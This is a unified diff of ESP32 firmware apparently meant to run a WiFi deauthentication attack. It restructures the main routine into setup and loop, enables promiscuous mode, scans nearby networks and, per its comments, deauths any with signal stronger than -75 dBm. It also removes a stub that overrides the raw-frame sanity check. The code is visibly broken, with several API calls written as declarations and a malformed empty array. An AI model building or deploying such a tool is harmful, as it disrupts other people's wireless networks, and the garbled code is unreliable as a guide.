@@ -1,15 +1,11 @@
-#include <stdint.h>
-extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
-    return 0;
-}
-
 // Include Statements
 // -----------------------------------------
-#include <Arduino.h>
+// #include <Arduino.h>
 #include <WiFi.h>
 #include <WiFi.h>
 #include <string.h>
 #include <stdio.h>
+#include <stdint.h>
 #include <string>
 #include <string.h>
 #include <freertos/FreeRTOS.h>
@@ -27,6 +23,7 @@ extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32
 #include <regex.h>
 #include <MacRandomizer.h>
 #include "main.hpp"
+#include <math.h>
 
 MacRandomizer macRandom;
 
@@ -153,7 +150,53 @@ wifi_ap_record_t* combine_arrays(wifi_ap_record_t *array1, size_t size1, wifi_ap
   return combined_array;
 }
 
-void scan_loop() {
+// Configure the Network
+// ------------------------------------------
+void setup() {
+  pinMode(LED_PIN, OUTPUT);
+  digitalWrite(LED_PIN, LOW);   // Turn off LED
+  Serial.begin(115200);
+  Serial.println("Setting up Network");
+  delay(1000);
+
+  ++bootCount;
+  Serial.println("Boot number: " + String(bootCount));
+
+  print_wakeup_reason();
+
+  // Enable promiscuous mode
+  bool esp_wifi_set_promiscuous(true);
+  esp_wifi_set_protocol(WIFI_IF_STA, WIFI_PROTOCOL_11B);
+  Serial.println("Promiscuous Mode Enabled");
+
+  // Initialize WiFi in STA(station) mode
+  esp_wifi_stop();
+  esp_wifi_set_mode(WIFI_MODE_STA);
+
+  Serial.println("Station Mode Initialized");
+  // Set configuration values
+  wifi_country_t config = {
+    .cc = "US",
+    .schan = 1,
+    .nchan = CHANNEL_MAX,
+    .policy = WIFI_COUNTRY_POLICY_MANUAL,
+  };
+  int8_t esp_wifi_set_max_tx_power(80);
+  Serial.println("Setting Country Code to: " + String(config.cc));
+
+  wifi_country_t esp_wifi_set_country(config);
+};
+
+float q = 0;
+void loop() {
+	// Start Deauth Attack
+	Serial.println("Starting Deauth Attack");
+
+  q += 0.1;
+  Serial.println("Loop");
+  Serial.println(q);
+  Serial.println(cos(q));
+  Serial.println(sin(q));
   int ii = 0;
   char err = false;
   wifi_ap_record_t ap_records[] = {};
@@ -181,8 +224,12 @@ void scan_loop() {
         esp_err_t esp_wifi_scan_get_ap_records(uint16_t *number, wifi_ap_record_t *ap_records);
         wifi_ap_record_t *records = (wifi_ap_record_t*)malloc(num_networks*sizeof(wifi_ap_record_t));
         err = esp_wifi_scan_get_ap_records(&num_networks, records);
+        char buffer[100];
         Serial.println("Networks found: " + num_networks);
-        Serial.println("With errors: " + err);
+        char err_label[] = "With Errors: ";
+        strcpy(buffer, err_label);
+        strcat(buffer, String(err).c_str());
+        Serial.println(buffer);
 
         if (num_networks > 0)
         {
@@ -196,7 +243,7 @@ void scan_loop() {
         };
       };
     };
-    
+
     // if network signal is greater than -75, deauth
     for (int i = 0; i < num_networks; i++)
     {
@@ -213,7 +260,7 @@ void scan_loop() {
     delay(scan_delay);
     ii++;
     };
-    
+
   // Sleep to conserve power
   Serial.println("Going to sleep now");
   esp_sleep_enable_timer_wakeup(uS_TO_S_FACTOR * TIME_TO_SLEEP);
@@ -224,43 +271,5 @@ void scan_loop() {
   bool esp_deep_sleep_try();
 };
 
-// Configure the Network
-// ------------------------------------------
-void main_app() {
-  pinMode(LED_PIN, OUTPUT);
-  digitalWrite(LED_PIN, LOW);   // Turn off LED
-  Serial.begin(115200);
-  delay(1000);
-
-  ++bootCount;
-  Serial.println("Boot number: " + String(bootCount));
-
-  print_wakeup_reason();
-
-  // Initialize WiFi in STA(station) mode
-  esp_wifi_stop();
-  esp_wifi_set_mode(WIFI_MODE_STA);
-
-  Serial.println("Station Mode Initialized");
-  // Set configuration values
-  wifi_country_t config = {
-    .cc = "US",
-    .schan = 1,
-    .nchan = CHANNEL_MAX,
-    .policy = WIFI_COUNTRY_POLICY_MANUAL,
-  };
-  int8_t esp_wifi_set_max_tx_power(80);
-  Serial.println("Setting Country Code to: " + String(config.cc));
-  
-  wifi_country_t esp_wifi_set_country(config);
-
-  // Enable promiscuous mode
-  bool esp_wifi_set_promiscuous(true);
-  esp_wifi_set_protocol(WIFI_IF_STA, WIFI_PROTOCOL_11B);
-  Serial.println("Promiscuous Mode Enabled");
-
-  // Start Deauth Attack
-  Serial.println("Starting Deauth Attack");
-
-  void scan_loop();
-};
+void setup();
+void loop();
